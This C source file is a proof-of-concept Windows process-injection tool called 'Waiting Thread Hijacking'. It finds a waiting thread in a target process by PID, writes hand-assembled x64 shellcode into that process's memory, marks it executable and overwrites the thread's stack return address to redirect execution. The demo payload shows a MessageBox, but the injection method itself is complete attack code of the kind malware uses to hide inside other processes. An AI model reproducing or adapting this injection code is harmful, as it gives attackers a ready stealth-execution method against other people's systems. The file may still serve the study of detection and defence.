#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <psapi.h>

#pragma comment(lib, "ntdll.lib")

// NT Structures and Definitions
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

#ifndef SystemProcessInformation
#define SystemProcessInformation 5
#endif

// Thread state constant - Waiting
#ifndef Waiting
#define Waiting 5
#endif

// Wait reason constant - WrQueue
#ifndef WrQueue
#define WrQueue 15
#endif

typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// Shellcode stub - saves/restores registers and jumps back to original return address
// The first 8 bytes will be overwritten with the original return address
unsigned char g_shellcode_stub[] = {
    // Original return address placeholder (will be overwritten)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

    // pushfq
    0x9C,
    // push rax
    0x50,
    // push rbx
    0x53,
    // push rcx
    0x51,
    // push rdx
    0x52,
    // push rsi
    0x56,
    // push rdi
    0x57,
    // push rbp
    0x55,
    // push r8
    0x41, 0x50,
    // push r9
    0x41, 0x51,
    // push r10
    0x41, 0x52,
    // push r11
    0x41, 0x53,
    // push r12
    0x41, 0x54,
    // push r13
    0x41, 0x55,
    // push r14
    0x41, 0x56,
    // push r15
    0x41, 0x57,

    // sub rsp, 0x28 (shadow space + alignment)
    0x48, 0x83, 0xEC, 0x28,
};

unsigned char g_shellcode_cleanup[] = {
    // add rsp, 0x28
    0x48, 0x83, 0xC4, 0x28,

    // pop r15
    0x41, 0x5F,
    // pop r14
    0x41, 0x5E,
    // pop r13
    0x41, 0x5D,
    // pop r12
    0x41, 0x5C,
    // pop r11
    0x41, 0x5B,
    // pop r10
    0x41, 0x5A,
    // pop r9
    0x41, 0x59,
    // pop r8
    0x41, 0x58,
    // pop rbp
    0x5D,
    // pop rdi
    0x5F,
    // pop rsi
    0x5E,
    // pop rdx
    0x5A,
    // pop rcx
    0x59,
    // pop rbx
    0x5B,
    // pop rax
    0x58,
    // popfq
    0x9D,

    // Jump back to original return address (stored at offset -X from current position)
    // mov rax, [rip - offset_to_saved_ret]
    // We need to calculate the offset dynamically
    // For now, use a pattern that will be patched
    0x48, 0xB8,  // movabs rax, imm64
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // placeholder for original return address

    // jmp rax
    0xFF, 0xE0
};

// Simple MessageBox payload
unsigned char g_payload_messagebox[] = {
    // MessageBoxA(NULL, "Injected!", "Success", MB_OK)
    // sub rsp, 0x28
    0x48, 0x83, 0xEC, 0x28,

    // xor ecx, ecx (hWnd = NULL)
    0x31, 0xC9,

    // lea rdx, [rip + message]
    0x48, 0x8D, 0x15, 0x1A, 0x00, 0x00, 0x00,

    // lea r8, [rip + title]
    0x4C, 0x8D, 0x05, 0x1B, 0x00, 0x00, 0x00,

    // xor r9d, r9d (MB_OK = 0)
    0x45, 0x31, 0xC9,

    // mov rax, MessageBoxA
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

    // call rax
    0xFF, 0xD0,

    // add rsp, 0x28
    0x48, 0x83, 0xC4, 0x28,

    // ret (will never reach here, cleanup will jump back)
    0xC3,

    // Message string
    'I', 'n', 'j', 'e', 'c', 't', 'e', 'd', '!', 0x00,
    // Title string
    'W', 'a', 'i', 't', 'i', 'n', 'g', ' ', 'T', 'h', 'r', 'e', 'a', 'd', ' ', 'H', 'i', 'j', 'a', 'c', 'k', 0x00
};

// Helper: Get module by address in remote process
HMODULE GetModuleByAddress(HANDLE hProcess, PVOID addr) {
    HMODULE hMods[1024];
    DWORD cbNeeded;

    if (!EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        return NULL;
    }

    DWORD moduleCount = cbNeeded / sizeof(HMODULE);
    for (DWORD i = 0; i < moduleCount; i++) {
        MODULEINFO modInfo;
        if (GetModuleInformation(hProcess, hMods[i], &modInfo, sizeof(modInfo))) {
            if (addr >= modInfo.lpBaseOfDll &&
                addr < (PVOID)((ULONG_PTR)modInfo.lpBaseOfDll + modInfo.SizeOfImage)) {
                return hMods[i];
            }
        }
    }

    return NULL;
}

// Helper: Check if return address points to ntdll/kernel32/kernelbase
BOOL IsValidReturnTarget(HANDLE hProcess, PVOID retAddr) {
    HMODULE hMod = GetModuleByAddress(hProcess, retAddr);
    if (!hMod) {
        printf("[-] Return address 0x%llx not in any module\n", (ULONGLONG)retAddr);
        return FALSE;
    }

    char modName[MAX_PATH];
    if (GetModuleBaseNameA(hProcess, hMod, modName, sizeof(modName))) {
        printf("[*] Return address 0x%llx in module: %s\n", (ULONGLONG)retAddr, modName);

        if (_stricmp(modName, "ntdll.dll") == 0 ||
            _stricmp(modName, "kernel32.dll") == 0 ||
            _stricmp(modName, "kernelbase.dll") == 0) {
            return TRUE;
        }
    }

    printf("[-] Return address not in ntdll/kernel32/kernelbase\n");
    return FALSE;
}

// Helper: Enumerate threads and find suitable waiting thread
BOOL FindWaitingThread(DWORD pid, DWORD waitReason, DWORD* outTid, ULONGLONG* outRsp, ULONGLONG* outRetAddr) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    pNtQuerySystemInformation NtQuerySystemInformation =
        (pNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) return FALSE;

    // Allocate buffer for process information
    ULONG bufferSize = 0x10000;
    PVOID buffer = NULL;
    NTSTATUS status;

    do {
        buffer = malloc(bufferSize);
        if (!buffer) return FALSE;

        ULONG returnLength = 0;
        status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &returnLength);

        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            free(buffer);
            bufferSize = returnLength;
            continue;
        }
        break;
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (status != STATUS_SUCCESS) {
        free(buffer);
        return FALSE;
    }

    // Find our process
    PSYSTEM_PROCESS_INFORMATION procInfo = (PSYSTEM_PROCESS_INFORMATION)buffer;
    BOOL found = FALSE;

    while (TRUE) {
        if ((DWORD)(ULONG_PTR)procInfo->UniqueProcessId == pid) {
            printf("[*] Found process, analyzing %lu threads\n", procInfo->NumberOfThreads);

            // Open process
            HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
            if (!hProcess) {
                printf("[-] Failed to open process: %lu\n", GetLastError());
                break;
            }

            // Get pointer to thread array (immediately after SYSTEM_PROCESS_INFORMATION)
            PSYSTEM_THREAD_INFORMATION threadInfo = (PSYSTEM_THREAD_INFORMATION)(procInfo + 1);

            // Check each thread
            for (ULONG i = 0; i < procInfo->NumberOfThreads; i++) {

                if (threadInfo->ThreadState == Waiting) {
                    DWORD tid = (DWORD)(ULONG_PTR)threadInfo->ClientId.UniqueThread;

                    printf("[*] TID %lu: State=Waiting, WaitReason=%lu\n", tid, threadInfo->WaitReason);

                    // Check wait reason if specified
                    if (waitReason != 0xFFFFFFFF && threadInfo->WaitReason != waitReason) {
                        continue;
                    }

                    // Open thread and get context
                    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, tid);
                    if (!hThread) {
                        printf("[-] Failed to open thread %lu\n", tid);
                        continue;
                    }

                    CONTEXT ctx = {0};
                    ctx.ContextFlags = CONTEXT_FULL;

                    if (!GetThreadContext(hThread, &ctx)) {
                        printf("[-] Failed to get thread context: %lu\n", GetLastError());
                        CloseHandle(hThread);
                        continue;
                    }

                    CloseHandle(hThread);

                    // Read return address from stack
                    ULONGLONG retAddr = 0;
                    SIZE_T bytesRead = 0;

                    if (!ReadProcessMemory(hProcess, (PVOID)ctx.Rsp, &retAddr, sizeof(retAddr), &bytesRead) ||
                        bytesRead != sizeof(retAddr)) {
                        printf("[-] Failed to read return address from stack\n");
                        continue;
                    }

                    printf("[*] RSP: 0x%llx, Return address: 0x%llx\n", ctx.Rsp, retAddr);

                    // Validate return address
                    if (IsValidReturnTarget(hProcess, (PVOID)retAddr)) {
                        printf("[+] Found suitable thread: TID %lu\n", tid);
                        *outTid = tid;
                        *outRsp = ctx.Rsp;
                        *outRetAddr = retAddr;
                        found = TRUE;
                        break;
                    }
                }

                // Move to next thread
                threadInfo++;
            }

            CloseHandle(hProcess);
            break;
        }

        if (procInfo->NextEntryOffset == 0) break;
        procInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)procInfo + procInfo->NextEntryOffset);
    }

    free(buffer);
    return found;
}

// Main injection function
BOOL InjectWaitingThread(DWORD pid, DWORD waitReason) {
    printf("[*] Target PID: %lu\n", pid);
    printf("[*] Wait reason filter: %lu (0xFFFFFFFF = any)\n", waitReason);

    // Find suitable waiting thread
    DWORD tid = 0;
    ULONGLONG rsp = 0;
    ULONGLONG originalRetAddr = 0;

    if (!FindWaitingThread(pid, waitReason, &tid, &rsp, &originalRetAddr)) {
        printf("[-] No suitable waiting thread found\n");
        return FALSE;
    }

    printf("[+] Target thread found: TID %lu\n", tid);
    printf("[+] RSP: 0x%llx\n", rsp);
    printf("[+] Original return address: 0x%llx\n", originalRetAddr);

    // Open process
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process: %lu\n", GetLastError());
        return FALSE;
    }

    // Resolve MessageBoxA address in target process
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32) {
        printf("[-] Failed to load user32.dll\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    PVOID pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
    if (!pMessageBoxA) {
        printf("[-] Failed to get MessageBoxA address\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    // Patch MessageBoxA address into payload
    memcpy(g_payload_messagebox + 0x1A, &pMessageBoxA, sizeof(PVOID));

    // Calculate total shellcode size
    SIZE_T totalSize = sizeof(g_shellcode_stub) + sizeof(g_payload_messagebox) + sizeof(g_shellcode_cleanup);

    // Allocate memory in target process
    PVOID pRemoteShellcode = VirtualAllocEx(hProcess, NULL, totalSize,
                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteShellcode) {
        printf("[-] Failed to allocate memory in target process: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Allocated shellcode at: 0x%llx (size: %llu bytes)\n",
           (ULONGLONG)pRemoteShellcode, (ULONGLONG)totalSize);

    // Build complete shellcode
    BYTE* fullShellcode = (BYTE*)malloc(totalSize);
    if (!fullShellcode) {
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    SIZE_T offset = 0;

    // 1. Copy stub (with placeholder for original return address)
    memcpy(fullShellcode + offset, g_shellcode_stub, sizeof(g_shellcode_stub));
    offset += sizeof(g_shellcode_stub);

    // 2. Copy payload
    memcpy(fullShellcode + offset, g_payload_messagebox, sizeof(g_payload_messagebox));
    offset += sizeof(g_payload_messagebox);

    // 3. Copy cleanup
    memcpy(fullShellcode + offset, g_shellcode_cleanup, sizeof(g_shellcode_cleanup));

    // Patch original return address into cleanup code
    // Offset 0x1E is where the movabs rax immediate value starts
    memcpy(fullShellcode + offset + 0x1E, &originalRetAddr, sizeof(originalRetAddr));

    // Write original return address to the first 8 bytes
    memcpy(fullShellcode, &originalRetAddr, sizeof(originalRetAddr));

    // Write shellcode to target process
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, pRemoteShellcode, fullShellcode, totalSize, &bytesWritten) ||
        bytesWritten != totalSize) {
        printf("[-] Failed to write shellcode: %lu\n", GetLastError());
        free(fullShellcode);
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    free(fullShellcode);

    printf("[+] Shellcode written successfully\n");

    // Make shellcode executable
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, pRemoteShellcode, totalSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] Failed to make shellcode executable: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Shellcode is now executable\n");

    // Calculate shellcode entry point (skip the saved return address)
    ULONGLONG shellcodeEntry = (ULONGLONG)pRemoteShellcode + 8;

    // Overwrite return address on stack
    if (!WriteProcessMemory(hProcess, (PVOID)rsp, &shellcodeEntry, sizeof(shellcodeEntry), &bytesWritten) ||
        bytesWritten != sizeof(shellcodeEntry)) {
        printf("[-] Failed to overwrite return address on stack: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("[+] Return address overwritten!\n");
    printf("[+] Shellcode will execute when thread returns\n");

    CloseHandle(hProcess);
    return TRUE;
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("Waiting Thread Hijacking\n");
    printf("========================================\n\n");

    if (argc < 2) {
        printf("Usage: %s <PID> [wait_reason]\n", argv[0]);
        printf("\nWait reasons:\n");
        printf("  15 = WrQueue (default)\n");
        printf("  0xFFFFFFFF = Any wait reason\n");
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    DWORD waitReason = WrQueue;  // Default to WrQueue

    if (argc > 2) {
        waitReason = strtoul(argv[2], NULL, 0);
    }

    if (InjectWaitingThread(pid, waitReason)) {
        printf("\n[+] Injection successful!\n");
        printf("[*] Wait for the target thread to return from its waiting state\n");
        return 0;
    } else {
        printf("\n[-] Injection failed!\n");
        return 1;
    }
}
